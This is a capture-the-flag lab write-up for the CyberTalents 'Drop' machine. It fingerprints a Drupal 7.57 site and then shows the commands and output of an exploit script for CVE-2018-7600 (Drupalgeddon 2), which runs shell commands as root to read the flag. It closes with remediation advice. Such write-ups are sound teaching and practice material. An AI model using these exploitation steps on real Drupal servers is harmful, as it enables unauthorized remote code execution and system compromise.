# CyberTalents — Drop

## Challenge Overview

- **Platform:** CyberTalents
- **Challenge Name:** Drop
- **Category:** Machines
- **Difficulty:** Medium
- **Points:** 100
- **Vulnerability:** CVE-2018-7600 (Drupalgeddon 2 — Drupal 7 Form API RCE)
- **Exploit Script:** [exploit_cve_2018_7600.py](./exploit_cve_2018_7600.py)

---

## Analysis & Approach

When a web application exposes its CMS version and runs an unpatched release with known remote code execution flaws, checking for applicable CVEs is a practical starting point. In this challenge, fingerprinting the target showed **Drupal 7.57** served via `nginx/1.27.1` and `PHP/7.0.28`.

Drupal 7 versions before 7.58 are affected by **CVE-2018-7600**, where improper input sanitization in Drupal's Form API allows attacker-controlled input to alter render-array properties. In vulnerable configurations, this can lead to remote code execution (RCE).

---

## Step-by-Step Walkthrough

### 1. Initial Web Reconnaissance & Version Fingerprinting

I started by setting the target environment variable and inspecting the HTTP response headers and HTML body to identify the technology stack.

```bash
export TARGET="http://cdcamol2z7oimz50gm73pw5yfqzqw5l3n1jwfqz6o-web.cybertalentslabs.com"

curl -i "$TARGET"
```

Key findings from the headers and markup:

- **Web Server:** nginx/1.27.1
- **Runtime:** PHP/7.0.28
- **CMS & Theme:** Drupal 7, using the default Bartik theme

Next, I checked common Drupal files and endpoints to confirm the exact version and exposed paths.

```bash
curl -i "$TARGET/CHANGELOG.txt"
curl -i "$TARGET/core/CHANGELOG.txt"
curl -i "$TARGET/user/login"
curl -i "$TARGET/robots.txt"
```

- `/CHANGELOG.txt` returned HTTP 200 and listed Drupal 7.57.
- `/core/CHANGELOG.txt` returned HTTP 404, matching the Drupal 7 directory layout rather than Drupal 8+.
- `/robots.txt` returned HTTP 200 and listed standard Drupal paths.

### 2. Exploiting CVE-2018-7600 for Command Execution

With Drupal 7.57 confirmed, I used `exploit_cve_2018_7600.py` to poison the password-reset form, retrieve the resulting `form_build_id`, and trigger command execution through the AJAX file path.

First, I checked the working directory and current user context:

```bash
python3 exploit_cve_2018_7600.py "$TARGET/" -c "/bin/bash2 -p -c 'pwd'"
python3 exploit_cve_2018_7600.py "$TARGET/" -c "/bin/bash2 -p -c 'whoami'"
```

Sample output:

```text
=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-K7QwgMqMumivmRc6_CvsQlrm94WIDG8DXH2eW05ocUQ
[*] Triggering exploit to execute: /bin/bash2 -p -c 'pwd'

/var/www/html
```

```text
[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-2lvpWkP1xYJxfYPiUkMNGvitK5a_hVpXKu659JcHXVM
[*] Triggering exploit to execute: /bin/bash2 -p -c 'whoami'

root
```

**Analysis:** The command executed under the root user context, meaning no separate local privilege-escalation step was needed once remote code execution succeeded.

### 3. Locating and Reading the Flag

I inspected the filesystem root (`/`) and then `/root` to locate the flag file.

```bash
python3 exploit_cve_2018_7600.py "$TARGET/" -c "/bin/bash2 -p -c 'cd / && ls'"
python3 exploit_cve_2018_7600.py "$TARGET/" -c "/bin/bash2 -p -c 'cd /root && ls'"
```

Output from `/root`:

```text
[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-tRj1WKHyhKnrWunkh091Gabi1B3EIGq8iWR84a0zIoY
[*] Triggering exploit to execute: /bin/bash2 -p -c 'cd /root && ls'

flag.txt
```

Finally, I read `/root/flag.txt` to complete the challenge:

```bash
python3 exploit_cve_2018_7600.py "$TARGET/" -c "/bin/bash2 -p -c 'cd /root && ls && cat flag.txt'"
```

- **Flag:** `FLAG{REDACTED}`

---

## Remediation

- **Upgrade Drupal:** Upgrade Drupal core to a patched release. Drupal 7.58 addressed CVE-2018-7600; use a currently supported version wherever possible.
- **Upgrade PHP:** Replace outdated PHP versions with a supported release.
- **Reduce information exposure:** Restrict access to informational files such as `CHANGELOG.txt` where appropriate.
- **Keep dependencies updated:** Regularly patch web applications, runtimes, and server components.
